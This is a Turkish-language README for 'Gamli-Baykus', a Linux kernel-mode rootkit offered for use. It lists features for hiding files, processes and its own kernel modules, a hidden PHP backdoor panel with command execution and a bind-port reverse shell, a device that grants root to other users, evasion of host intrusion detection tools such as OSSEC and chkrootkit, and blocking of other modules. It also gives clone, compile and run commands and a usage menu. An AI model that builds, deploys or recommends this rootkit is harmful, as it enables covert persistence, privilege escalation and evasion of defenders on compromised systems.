# Gamli-Baykus

![Autro](autro.jpg)




**Kernel Mode Rootkit**


***NOT : Kodlardaki zaafiyetlerin farkındayım, ilk sürüm olduğu için çok özen gösteremedim. Bunu bir intro olarak düşünebilirsiniz,
 v2.0 sürümünde daha iyi özellikler ile karşınızda olacak***
 
 

**Test Edildiği Sistemler : Ubuntu 18.04 // CentOS 7.8.0**


### Özellikleri


**Kendi LKM lerini gizleme**

**Dosyalari gizleme**

**Processleri gizleme**

**PHP arayuzu icin gizlenmis server portu**

**Farklı kullanıcıllardan root erişimi alabilmek için Bir device oluşturma.**

**HIDS Bypass (Agent Simth , Ossec , chrootkit , kstat , HiddenWall,lsrootkit)**

**Harici Yüklenecek LKM leri Engelleme**

**Gizli PHP Arayuz (Porta Kurulu)**


**PHP Arayuz ozellikleri :**

**Dosya sisteminde gozukmeme**

**Panel Anasayfa Guard (IP LOGGER)**

**CMD Komut calistirma**

**Bind Port Reverse Shell**



### Helper

```
Usage: ./gamlibaykus [OPTION]                                     
                                                                              
./gamlibaykus -help                                               	
                                                                               	      
================= [ Rootkit Functions ] =================          
                                                                                   
-fileseek (Hedef Dosyayi Gizle)                                    
                                                                              
-procseek (Hedef Processi Gizle)                                   
                                                                               
-rootdevice (Root Yetkisi icin bir device olustur)                 
                                                                               
-insdoor (Porta PHP Tabanli Backdoor Ara yuzunu kur)               
                                                                                 
-locklkm (Harici LKM leri Engelleme)                               
                                                                                 
-uninstall (Butun LKM leri , Yapilan tum degisiklikleri Kaldir)
```

### Kurulum :

```
git clone https://github.com/0x00fy/Gamli-Baykus.git

cd Gamli-Baykus

gcc gamlibaykus.c -o gamlibaykus -w

./gamlibaykus [OPTION]

```


